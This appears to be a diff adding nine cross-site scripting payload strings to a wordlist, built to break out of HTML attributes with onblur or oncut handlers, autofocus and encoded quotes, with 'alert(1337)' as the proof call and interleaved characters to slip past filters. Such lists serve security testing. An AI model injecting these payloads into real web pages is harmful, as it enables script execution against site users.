@@ -1,0 +1,9 @@
+“oncut=’/*
+"onblur<='`
+`;alert(1337)'autofocus x="
+"autofocus x=
+"o<nblur=&apos;`
+`,alert(1337)&apos;autofocus="
+<"<o<n<b<l<u<r<=<&apos;<`
+${alert(1337)}`' autofocus
+<"<i<d<=<x< c<o<n<t<e<n<t<e<d<i<t<a<b<l<e</<
